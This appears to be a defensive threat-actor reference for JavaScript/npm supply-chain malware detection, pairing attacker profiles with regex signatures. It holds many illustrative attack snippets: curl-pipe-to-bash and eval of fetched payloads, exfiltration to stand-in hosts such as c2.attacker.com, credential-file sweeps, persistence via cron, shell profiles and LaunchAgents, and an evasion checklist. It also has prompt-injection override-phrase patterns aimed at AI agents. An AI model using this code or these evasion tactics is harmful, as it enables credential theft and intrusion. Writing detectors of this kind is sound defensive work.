# Attacker Profiles & Threat Actor Reference

Maps actor type → goal → technique → attack signature. Primarily JS/TS examples; the reasoning generalizes. Load when you need to think like a specific attacker type.

Pair with [Advanced Threat Patterns](./advanced-threat-patterns.md) for comprehensive detection regex and AST signatures, [Security Investigation Reference](./security-investigation-reference.md) for search packs, and [Access Control Attacks](./access-control-attacks.md) for authorization bypass exploitation.

---

## 1. Threat Actor Taxonomy

### 1.1 Nation-State APT Groups

**Profile**: Sophisticated, patient, well-resourced. Goal: espionage, IP theft, sabotage, long-term persistence. Willing to burn zero-days. Operate for months before activating.

**Countries with documented JS/supply chain activity:**

| Country | Groups | JS-Relevant TTPs |
|---|---|---|
| **North Korea** | Lazarus, BlueNoroff, TraderTraitor | npm supply chain attacks (2022–2024), crypto wallet theft, fake job offers with malicious packages, `electron` app trojanization |
| **Russia** | Cozy Bear (APT29), Sandworm, Turla | SolarWinds-style build pipeline compromise, JS skimmer injection via CDN, OAuth token harvesting via browser extensions |
| **China** | APT41, APT10, UNC2630 | Watering hole attacks via JS injection, browser extension backdoors, supply chain via open source contributions |
| **Iran** | Charming Kitten, Moses Staff | Spear phishing via malicious JS in email attachments, credential harvesting pages |
| **Israel** (commercial) | NSO Group (Pegasus), Candiru | Browser zero-day exploit delivery via JS, one-click and zero-click chains |

**Detection focus for APT JS:**
- Long-dormant packages with sudden behavioral changes
- Build pipeline tampering (checksums don't match source)
- Legitimate-looking packages that add exactly one new suspicious dependency
- Crypto/Web3 apps specifically targeted (Lazarus focus)
- Browser extension updates that add new permissions

```regex
# Crypto wallet targeting patterns (Lazarus signature)
/(?:seed.?phrase|mnemonic|private.?key|wallet|metamask|phantom|ledger)/i

# OAuth/token harvesting (APT29 pattern)
/(?:access_token|refresh_token|id_token|client_secret)['"]\s*[:=]/i

# Build pipeline checksum bypass
/(?:SKIP_CHECKSUM|DISABLE_VERIFY|NO_VERIFY|--no-verify)\b/i
```

---

### 1.2 Organized Cybercrime Groups

**Profile**: Financially motivated, operate at scale. Goal: steal money, ransomware, credential markets. Use commodity tooling. Fast — deploy-and-monetize within days of access.

**Key groups and JS methods:**

| Group/Type | Specialty | JS Attack Method |
|---|---|---|
| **MageCart** (collective) | Payment card skimming | Inject JS into e-commerce checkout pages, intercept `form.submit()` |
| **FIN7** | POS/retail targeting | Malicious npm packages targeting retail CI/CD pipelines |
| **Evil Corp** | Banking trojans | Webinject JS modifications to banking sites via browser extensions |
| **REvil/BlackMatter** | Ransomware-as-a-Service | JS-based initial access via malicious packages, then pivot to ransomware |
| **Generic credential thieves** | Account takeover | npm packages that harvest `~/.npmrc`, `~/.aws`, `~/.ssh`, browser cookies |

**Detection focus for criminal JS:**
```regex
# MageCart payment skimmer signatures
/(?:document\.querySelector|getElementById)\s*\([^)]*(?:card|cvv|cc_|credit|payment|checkout)/i
/\.addEventListener\s*\(\s*['"]submit['"]\s*,/
/(?:navigator\.sendBeacon|new\s+Image\s*\(\s*\)\.src)\s*=\s*[^;]*(?:card|cvv|pan|track)/is

# Credential harvester — browser cookie + keylogger combo
/document\.cookie[^;]{0,200}(?:fetch|XMLHttpRequest|sendBeacon)/s
/addEventListener\s*\(\s*['"]keydown['"][^)]{0,200}(?:fetch|sendBeacon|xhr)/s

# Banking webinject pattern
/window\.__original_\w+\s*=\s*\w+\.\w+/  # method wrapping to intercept
/(?:XMLHttpRequest|fetch)\.prototype\.\w+\s*=/  # XHR prototype patching
```

---

### 1.3 Hacktivist / Protest / Insider

**Profile**: Motivated by ideology, grievance, or politics. May be insiders with legitimate access. Goal: disruption, destruction, embarrassment, data leaks.

**node-ipc case study (2022)**: Developer added country-targeting logic bomb to protest Russia/Ukraine war. Wiped files on machines in Russia/Belarus.

```javascript
// node-ipc pattern — the actual attack code shape
fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
  if (['RU','BY'].includes(data.country_code)) {
    // destructive payload — file deletion, overwrite with ❤️
    require('fs').writeFileSync(file, '♥');
  }
});
```

**Detection focus:**
```regex
# Geolocation + destructive action
/(?:ipapi|ipinfo|ip-api)[^;]{0,300}(?:unlink|writeFile|rmdir|rm\s|rimraf)/s

# Country code targeting
/(?:includes|indexOf)\s*\(\s*['"][A-Z]{2}['"]\s*\)[^;]{0,200}(?:unlink|write|delete|rm)/s

# Protest/message writing to files
/writeFileSync\s*\([^)]+['"](?:♥|❤|I love you|peace|freedom|stop\s+war)/

# Insider threat — accessing data they shouldn't
/(?:readFileSync|readFile)\s*\([^)]*(?:\/etc\/shadow|\/etc\/passwd|\.ssh\/|authorized_keys)/
```

---

### 1.4 Script Kiddies / Commodity Attackers

**Profile**: Low skill, use public exploit kits and off-the-shelf tools. High volume, opportunistic. Use known CVEs, typosquatting, and copied malware templates.

**Signature**: Code copied from GitHub exploit POCs, obvious variable names, no evasion, attacks known CVEs in popular packages.

**Detection**: Standard signatures work well. Focus on:
- CVE-specific exploitation patterns
- Known malware templates (obfuscator.io default settings)
- Typosquatted package names (1-2 char edit distance)

---

### 1.5 Bug Bounty Hunters / Penetration Testers (Authorized)

**Profile**: Legitimate security researchers. Goal: find and responsibly disclose.

**Their approach** (what they look for — also what you should look for):
- Source maps in production → full source disclosure
- Hardcoded secrets in bundles
- Client-side auth checks
- Admin routes hidden in JS
- Prototype pollution gadget chains
- postMessage origin not validated

---

### 1.6 Rogue Maintainers / Compromised Accounts

**Profile**: Open source maintainer account takeover, or maintainer turns malicious. Goal: monetize access to package with millions of downloads.

**How it happens:**
- Maintainer account credentials phished or credential-stuffed
- Package transferred to new "helpful" maintainer who adds malware
- Maintainer sells package to bad actor

**Real incidents:**
- `event-stream` (2018) — maintainer transferred to bad actor who added `flatmap-stream`
- `ua-parser-js` (2021) — maintainer account taken over, malicious version published
- `node-ipc` (2022) — legitimate maintainer added protest code

**Detection focus:**
```regex
# New maintainer + first significant code addition
# (check git log / npm publish history)

# Package description used as crypto key (event-stream pattern)
/(?:description|name|version)\s*\]\s*\)\s*\.(?:toString|slice|split)/
/require\s*\(\s*['"]\.\.\/package\.json['"]\s*\)\s*\.\s*(?:description|name)/

# Flatmap-stream specific pattern
/Buffer\s*\.\s*from\s*\([^,]+,\s*['"]hex['"]\s*\)[^;]{0,200}createDecipher/s
```

---

## 2. Attack Goals → Techniques → JS Signatures

### 2.1 Credential & Secret Theft

**What attackers want:**
- AWS keys, GCP credentials, Stripe keys
- SSH private keys, GPG keys
- npm tokens, GitHub tokens (allow supply chain pivot)
- Database passwords, connection strings
- JWT signing secrets
- Browser cookies (session hijack)
- Saved browser passwords

**Attack paths:**
```javascript
// Path A: environment variable sweep
const secrets = {};
Object.keys(process.env).forEach(k => {
  if (/key|secret|token|pass|pwd|auth|cred/i.test(k)) secrets[k] = process.env[k];
});
exfil(secrets);

// Path B: filesystem credential files
const targets = [
  os.homedir() + '/.ssh/id_rsa',
  os.homedir() + '/.aws/credentials',
  os.homedir() + '/.npmrc',
  os.homedir() + '/.gitconfig',
  '/etc/passwd',
  process.cwd() + '/.env',
];

// Path C: browser cookie theft (via Electron/extension)
// Chrome on macOS: ~/Library/Application Support/Google/Chrome/Default/Cookies
// SQLite database — decrypt with DPAPI/keychain

// Path D: in-memory secret sweep (Node.js process)
// Access process.binding('crypto') or v8 heap snapshots
```

**Detection regex:**
```regex
# Env var key filtering for secrets
/Object\.keys\s*\(\s*process\.env\s*\)[^;]{0,200}(?:key|secret|token|pass|auth)/is

# Multi-target credential file sweep
/(?:id_rsa|\.aws|\.npmrc|\.env|\.gitconfig)['"]\s*,\s*['"][^'"]{0,100}(?:id_rsa|\.aws|\.npmrc)/s

# Chrome cookie database path
/Library\/Application\s+Support\/Google\/Chrome|AppData\\Roaming\\Google\\Chrome/

# process heap / v8 snapshot
/v8\.writeHeapSnapshot|process\.memoryUsage\(\)\s*\.\s*heapUsed/
```

---

### 2.2 Remote Code Execution (RCE)

**Attack goal:** Execute arbitrary commands on the victim's machine.

**JS RCE paths:**

```javascript
// Path A: postinstall direct exec
require('child_process').exec('curl https://c2.example.com/payload | bash');

// Path B: eval of network-fetched code
fetch('https://c2.example.com/payload').then(r => r.text()).then(eval);

// Path C: prototype pollution → spawn gadget
// Pollute: obj.__proto__.shell = true
// Then: child_process.spawn(userControlled)  ← shell: true → command injection

// Path D: template injection → SSTI → RCE
// EJS: <%- include(userInput) %>
// Pug: #{userInput}  where userInput = "= global.process.mainModule.require('child_process').execSync('id')"

// Path E: deserialization (node-serialize)
// {"x":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// Path F: Electron nodeIntegration XSS → RCE
// XSS in Electron with nodeIntegration:true === full RCE
// require('child_process') accessible from renderer

// Path G: vm.runInNewContext escape
// Not truly isolated — can escape via constructor chains
vm.runInNewContext(`this.constructor.constructor('return process')().exit(1)`);
```

**Detection regex:**
```regex
# Direct exec with encoded/fetched payload
/exec\s*\(\s*[^)]*(?:fetch|http|https|atob|Buffer\.from)[^)]*\)/s

# eval of fetched content
/fetch\s*\([^)]+\)[^;]{0,200}\.then\s*\([^)]*\)\s*\.then\s*\(\s*eval\s*\)/s

# SSTI in template engines
/(?:ejs|pug|handlebars|nunjucks)\s*\.\s*render(?:String|File)?\s*\([^)]*(?:req\.|body\.|params\.)/

# vm escape via constructor chain
/(?:vm\.runIn|runInNewContext|runInContext)[^;]{0,300}constructor\.constructor/s

# Electron nodeIntegration with eval/exec
/nodeIntegration\s*:\s*true[^}]{0,1000}(?:eval|exec|spawn|require\s*\()/s
```

---

### 2.3 Persistence

**Attack goal:** Survive restarts, updates, and reboots. Stay on system after initial infection.

**JS persistence mechanisms:**

```javascript
// Path A: npm global package installation
exec('npm install -g malicious-backdoor');

// Path B: cron job injection
fs.appendFileSync('/etc/cron.d/update-check',
  '*/5 * * * * node -e "require(\'https\').get(...)"'
);

// Path C: shell profile injection (.bashrc, .zshrc)
fs.appendFileSync(os.homedir() + '/.bashrc',
  '\nexport PATH="$HOME/.malicious/bin:$PATH"'
);

// Path D: systemd service / LaunchAgent
const plist = `<?xml version="1.0" ...>
  <key>ProgramArguments</key>
  <array><string>node</string><string>/tmp/.hidden/payload.js</string></array>
  <key>RunAtLoad</key><true/>
</dict>`;
fs.writeFileSync(os.homedir() + '/Library/LaunchAgents/com.apple.update.plist', plist);

// Path E: Service Worker (browser persistence — survives page close)
navigator.serviceWorker.register('/sw.js');

// Path F: Chrome extension auto-update C2
// Extension uses chrome.storage.sync to receive updated payload URLs
// Alarm API for periodic execution
chrome.alarms.create('tick', { periodInMinutes: 5 });

// Path G: Claude Code cron task injection (novel MCP vector)
// Plant a cron task via MCP that fires Claude Code with malicious context
```

**Detection regex:**
```regex
# Cron injection
/(?:cron|crontab|cron\.d)[^;]{0,200}(?:writeFile|appendFile|exec)/s

# Shell profile modification
/(?:\.bashrc|\.zshrc|\.profile|\.bash_profile)[^;]{0,200}(?:writeFile|appendFile)/s

# macOS LaunchAgent plist write
/LaunchAgents[^;]{0,200}(?:writeFile|writeFileSync)/s

# systemd service write
/\/etc\/systemd\/system\/[^;]{0,200}(?:writeFile|writeFileSync)/s

# npm global install
/exec\s*\(\s*['"]npm\s+install\s+-g/

# SW registration from XSS context
/navigator\s*\.\s*serviceWorker\s*\.\s*register\s*\([^)]*(?:\+|\$\{|Date\.now)/
```

---

### 2.4 Data Exfiltration

**Attack goal:** Get sensitive data out without detection.

**Exfil channels:**

```javascript
// Channel A: HTTPS POST (most common)
require('https').request({ hostname: 'c2.attacker.com', path: '/collect',
  method: 'POST' }, ()=>{}).end(JSON.stringify(payload));

// Channel B: DNS exfiltration (bypasses HTTP monitors)
// Encode data in subdomain: deadbeef.c2.attacker.com
const chunks = btoa(JSON.stringify(secrets)).match(/.{1,60}/g);
chunks.forEach((chunk, i) => dns.lookup(`${chunk}.${i}.exfil.attacker.com`, ()=>{}));

// Channel C: navigator.sendBeacon (fires even on page unload)
navigator.sendBeacon('https://c2.attacker.com/collect', JSON.stringify(data));

// Channel D: Image pixel beacon (bypasses CSP in some configs)
new Image().src = `https://c2.attacker.com/pixel?d=${encodeURIComponent(btoa(data))}`;

// Channel E: WebSocket (bidirectional C2)
const ws = new WebSocket('wss://c2.attacker.com');
ws.onopen = () => ws.send(JSON.stringify(payload));

// Channel F: Timing side-channel (extremely stealthy — no network traffic)
// Encode data in timing of HTTP requests to legitimate services

// Channel G: Cache API exfil (browser-side storage for later pickup)
caches.open('__app__').then(c => c.put('/__data__',
  new Response(JSON.stringify(secrets))));
```

**Detection regex:**
```regex
# DNS exfiltration via lookup
/dns\s*\.\s*(?:lookup|resolve)\s*\([^)]*(?:\+|btoa|encodeURIComponent)/

# sendBeacon with sensitive data
/navigator\s*\.\s*sendBeacon\s*\([^)]*(?:cookie|token|env|secret|password|key)/i

# Image pixel beacon with encoded data
/new\s+Image\s*\(\s*\)\s*\.\s*src\s*=\s*[^;]*(?:btoa|encodeURIComponent|cookie|token)/

# Cache API used as data store
/caches\s*\.\s*open\s*\([^)]+\)\s*\.then[^;]{0,200}cache\.put/s

# WebSocket to non-localhost destination
/new\s+WebSocket\s*\(\s*['"]wss?:\/\/(?!localhost|127\.0\.0\.1)/
```

---

### 2.5 Code Manipulation & Backdoors

**Attack goal:** Alter behavior silently so the application does something unintended.

**Techniques:**

```javascript
// Technique A: Method wrapping / monkey patching
const _origFetch = window.fetch;
window.fetch = async (url, opts) => {
  if (url.includes('/auth') || url.includes('/login')) {
    exfil({ url, body: opts?.body }); // intercept auth requests
  }
  return _origFetch(url, opts);
};

// Technique B: Prototype patching
const _origStringify = JSON.stringify;
JSON.stringify = function(obj) {
  if (obj && (obj.password || obj.token)) exfil(obj);
  return _origStringify.apply(this, arguments);
};

// Technique C: Supply chain function replacement
// Malicious version of lodash._merge that also exfils merge targets
// Malicious version of axios that logs all requests

// Technique D: Shadow DOM / hidden forms
const shadow = document.createElement('div').attachShadow({mode: 'closed'});
// Create invisible form that captures keystrokes

// Technique E: ServiceWorker request manipulation
self.addEventListener('fetch', event => {
  if (event.request.url.includes('/api/transfer')) {
    // Modify amount, change destination account
    const modified = modifyTransferRequest(event.request);
    event.respondWith(fetch(modified));
  }
});

// Technique F: AI prompt injection via JS
// Inject malicious instructions into data that an AI agent will read
// e.g., in a CLAUDE.md, .env comment, package.json description
```

**Detection regex:**
```regex
# fetch/XHR method wrapping
/(?:window\.fetch|XMLHttpRequest\.prototype)\s*=\s*(?:function|async\s+function|\([^)]*\)\s*=>)/

# JSON.stringify/parse prototype patching  
/JSON\s*\.\s*(?:stringify|parse)\s*=\s*function/

# Object prototype method replacement
/(?:Array|Object|String|Number)\.prototype\.\w+\s*=\s*function/

# SW request body modification
/addEventListener\s*\(\s*['"]fetch['"]\s*,[^}]{0,500}(?:clone|json|text)\s*\(\s*\)[^}]{0,500}respondWith/s

# AI prompt injection strings in JS
/ignore\s+(?:previous|prior|all)\s+instructions/i
/you\s+are\s+now\s+(?:in\s+)?(?:developer|DAN|jailbreak|unrestricted)\s+mode/i
/\[\s*SYSTEM\s*\]|\[\s*INST\s*\]|<\s*\|?\s*system\s*\|?\s*>/i
```

---

## 3. OS-Specific Attack Surfaces

### 3.1 macOS Targets

```
High-value files:
  ~/Library/Keychains/login.keychain-db       ← all saved passwords
  ~/Library/Application Support/Google/Chrome/Default/Cookies
  ~/Library/Application Support/Google/Chrome/Default/Login Data
  ~/Library/Application Support/Mozilla/Firefox/Profiles/*/logins.json
  ~/.ssh/id_rsa, ~/.ssh/id_ed25519
  ~/.aws/credentials
  ~/Library/Application Support/1Password/    ← password manager
  ~/Library/LaunchAgents/                     ← persistence location

Privilege escalation:
  osascript -e 'do shell script "..." with administrator privileges'
  AuthorizationExecuteWithPrivileges (deprecated but still works)
```

```regex
# macOS Keychain access
/security\s+find-(?:generic|internet)-password/
/(?:SecKeychainFind|SecItemCopyMatching)/
/Keychain|keychain-db/

# macOS persistence via LaunchAgent
/LaunchAgents[^;]{0,100}(?:writeFile|appendFile|plist)/

# osascript privilege escalation
/osascript\s+-e\s+['"]\s*do\s+shell\s+script/
/administrator\s+privileges/i
```

---

### 3.2 Windows Targets

```
High-value files:
  %APPDATA%\Microsoft\Credentials\            ← Windows credential store
  %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
  %APPDATA%\Mozilla\Firefox\Profiles\*/logins.json
  %USERPROFILE%\.ssh\
  %USERPROFILE%\.aws\credentials
  C:\Windows\System32\config\SAM              ← password hashes (needs SYSTEM)

Privilege escalation:
  UAC bypass via JS → COM object instantiation
  PowerShell -EncodedCommand (common staging)
  reg add HKCU\...\Run  (persistence)
```

```regex
# Windows credential paths
/(?:APPDATA|LOCALAPPDATA|USERPROFILE)[^;]{0,100}(?:Credentials|Chrome|Firefox|\.ssh|\.aws)/

# PowerShell execution from JS
/(?:powershell|pwsh)\s+(?:-enc|-encodedcommand|-command)/i
/exec\s*\(\s*['"]\s*powershell/i

# Registry persistence
/reg\s+add\s+HKCU\\[^\\]+\\Run/i
/RegCreateKeyEx|RegSetValueEx/
```

---

### 3.3 Linux / Server Targets

```
High-value files:
  /etc/shadow                                 ← password hashes
  /etc/passwd                                 ← user enumeration
  /proc/*/environ                             ← process environment variables
  /proc/*/mem                                 ← process memory
  ~/.ssh/authorized_keys                      ← add attacker's key for persistence
  /var/run/docker.sock                        ← Docker socket → container escape
  ~/.kube/config                              ← Kubernetes cluster access

Container escape:
  /proc/1/cgroup contains 'docker' → in container
  /var/run/docker.sock mounted → escape via Docker API
  CAP_SYS_ADMIN → mount host filesystem
```

```regex
# Linux sensitive file access
/(?:\/etc\/shadow|\/etc\/passwd|\/proc\/\d+\/environ|\/proc\/\d+\/mem)/

# SSH authorized_keys modification (persistence)
/authorized_keys[^;]{0,200}(?:writeFile|appendFile)/s

# Docker socket access
/\/var\/run\/docker\.sock/

# Container escape indicators
/\/proc\/1\/cgroup[^;]{0,200}(?:docker|containerd|lxc)/s

# Kubernetes config access
/\.kube\/config[^;]{0,200}(?:readFile|readFileSync)/
```

---

## 4. Supply Chain Attack Model

### 4.1 Attack Stages

```
Stage 1: TARGET SELECTION
  → Find packages with high download counts + small maintainer teams
  → Identify packages with lax security practices
  → Find recently abandoned packages
  → Identify CI/CD pipelines that auto-publish on merge

Stage 2: ACCESS ACQUISITION  
  → Phish maintainer credentials
  → Credential stuff leaked passwords against npm
  → Open source contribution (add yourself as maintainer)
  → Buy access from burnt-out maintainer
  → Typosquat / dependency confusion

Stage 3: PAYLOAD DELIVERY
  → Add postinstall script
  → Modify entry point to execute-on-import
  → Add malicious transitive dependency
  → Modify existing utility function to also exfil

Stage 4: EXECUTION & EXFIL
  → CI bail-out (only runs on developer machines)
  → Delayed execution (setTimeout 60s)
  → One-shot exfil (single request, no retry)
  → Clean return values (caller sees no change)

Stage 5: PERSISTENCE / PIVOT
  → Use stolen npm token to compromise more packages
  → Use AWS key to access cloud infrastructure
  → Use SSH key for lateral movement
  → Plant backdoor for future access
```

### 4.2 Supply Chain Attack Indicators

```regex
# Sudden new maintainer publish
# (check npm registry: last publish author changed)

# Version published outside normal cadence
# (major version bump with no changelog, or tiny patch with huge diff)

# New postinstall added that wasn't there before
/"(?:pre|post)?install"\s*:/

# New dependency added pointing to a low-download package
# (especially with a lifecycle script of its own)

# Package description used as decryption key (event-stream pattern)
/require\s*\(\s*['"][./]*package\.json['"]\s*\)\s*\.\s*description/

# Conditional payload based on package name (targets specific victims)
/require\s*\(\s*['"][./]*package\.json['"]\s*\)[^;]{0,100}(?:name|dependencies)/s
```

### 4.3 Dependency Confusion vs. Typosquatting

| Attack | Method | Detection |
|---|---|---|
| **Typosquatting** | `axois` instead of `axios` | Edit distance ≤ 2 to popular package |
| **Dependency confusion** | Internal pkg name published to public npm with higher version | Version 9999.0.0 from unknown author |
| **Namespace confusion** | `react-core` instead of `@react/core` | Scope stripping |
| **Combo squatting** | `axios-utils`, `axios-helper` | Legitimate name + common suffix |
| **Star jacking** | Clone popular repo, add malware, get confused installs | Zero real activity, copied README |

---

## 5. Data Flow Attack Model

### 5.1 The Universal Exfiltration Template

Every data theft attack follows this structure:

```
[ACQUIRE] → [COLLECT] → [ENCODE] → [EXFIL] → [CLEAN RETURN]
```

**ACQUIRE**: How data enters attacker control
- `process.env.*` (environment secrets)
- `fs.readFile(credentialPath)` (file secrets)
- `document.cookie` (session)
- `localStorage.getItem(tokenKey)` (auth token)
- Function parameters (input harvesting)
- `os.userInfo()` / `os.hostname()` (identity)

**COLLECT**: Aggregation
- `JSON.stringify(process.env)` (dump everything)
- Filtered: `Object.keys(env).filter(k => /key|secret|token/.test(k))`
- Targeted: specific key names

**ENCODE**: Hide the exfil
- `btoa(data)` — base64
- `encodeURIComponent(data)` — URL encoding
- Custom XOR cipher
- Compression (`zlib.deflate`)
- Split across multiple requests

**EXFIL**: Transmission
- HTTPS POST to C2
- DNS subdomain lookup
- Image pixel beacon
- sendBeacon
- WebSocket
- Cache API

**CLEAN RETURN**: Maintain cover
- Return the value the caller expected
- Swallow all errors from the exfil path
- Artificial delay to not correlate with the operation

**How to detect**: Search for any path that connects ACQUIRE to EXFIL. The code between them is the attack.

### 5.2 Taint Flow Decision Rules

When tracing data flow, ask at each step:

1. **Source**: Is this data sensitive? (credentials, secrets, user PII, auth tokens)
2. **Transformation**: Does encoding/encryption *protect* data (for legitimate use) or *hide* it (for exfil)?
3. **Sink**: Does this leave the process? To where? Is the destination attacker-controlled?
4. **Legitimacy test**: Is this transmission declared in the package documentation?

If source = sensitive AND sink = external AND transmission = undeclared → **exfiltration confirmed**

---

## 6. How the Most Dangerous Attackers Think

### The Expert Attacker's Checklist (Before Writing Code)

1. **"What does the victim run automatically?"** — postinstall, CI pipelines, cron jobs, import-time execution. These are the gold standard — no user interaction needed.

2. **"What secrets live in the environment?"** — Every developer has AWS keys, npm tokens, SSH keys, GitHub tokens. One compromised dev machine → access to their entire org.

3. **"How do I not get caught?"** — CI bail-out, delayed execution, single-shot exfil, clean return values, no error output. Make the attack invisible.

4. **"How do I stay?"** — Shell profile, LaunchAgent, cron, service worker, npm global. One run isn't enough; persistence multiplies ROI.

5. **"What can I pivot to?"** — Stolen npm token → publish to dependent packages. AWS key → lateral movement. SSH key → more machines. GitHub token → code changes.

6. **"What's the blast radius?"** — Target downstream dependents. A package with 10M weekly downloads is worth more than one with 100.

### The Defender's Counter-Checklist

For every piece of code:
1. What runs without user interaction?
2. What reads credentials or secrets?
3. What writes outside the expected scope?
4. What network calls are not in the docs?
5. What happens differently in production vs. CI vs. developer machines?
6. What does the code do that its stated purpose doesn't require?

If you can answer all 6 with "nothing suspicious" → low risk.  
If any answer is "something unexpected" → investigate that branch.
